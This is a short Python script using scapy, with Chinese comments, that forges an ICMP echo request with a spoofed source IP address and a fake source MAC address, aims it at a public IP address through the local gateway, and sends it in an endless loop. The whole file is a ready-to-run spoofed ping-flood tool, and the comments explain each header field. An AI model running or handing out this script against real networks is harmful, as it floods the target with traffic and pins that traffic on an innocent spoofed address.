#!/usr/bin/python
#!coding=utf-8

import sys
import os
from scapy.all import *

gateway_mac = '06:7c:45:db:f0:83'#网关MAC地址，先ping然后arp -a获得
target_ip = '8.8.8.8' #ip层目标主机地址
fakeip = '4.4.4.4' #ip层发送主机地址
fakemac = '09:7e:47:d0:f0:44' #伪造的发送主机mac
pack_ip = IP(dst = target_ip , src = fakeip ,proto = 0x01) #proto代表类型是ICMP包
pack_icmp = ICMP(type = 8) #type=8 代表为icmp echo 请求
pack_ether = Ether(src = fakemac , dst = gateway_mac ,type = 0x0800) 
#0800代表这个以太网包的数据部分是ipv4类型
info = Raw('aaaaa')

t = str(pack_ether/pack_ip/pack_icmp/info)
s = Ether(t)
while 1:
    sendp(s)